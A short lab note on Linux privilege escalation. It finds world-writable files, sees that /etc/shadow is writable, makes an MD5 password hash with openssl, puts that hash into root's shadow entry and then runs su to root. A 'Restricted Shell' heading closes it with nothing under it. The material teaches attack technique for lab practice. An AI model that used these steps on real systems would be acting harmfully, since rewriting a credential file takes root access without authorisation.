---
title: permissions
tags: [linux-security, privilege-escalation, type/lab, phase/privesc, platform/linux]
---

# Permissions

### Search for world writable files

```
find / -not -type l -perm -o+w 2>/dev/null
```

We found that `/etc/shadow` is world writable.

```
ls -l /etc/shadow
```

### Generate a hash for password "password"

```
openssl passwd -1 -salt abc password
```

Add the hash in the root entry in shadow file

### Escalate to root

```
su

<enter the new password>
```

## Restricted Shell
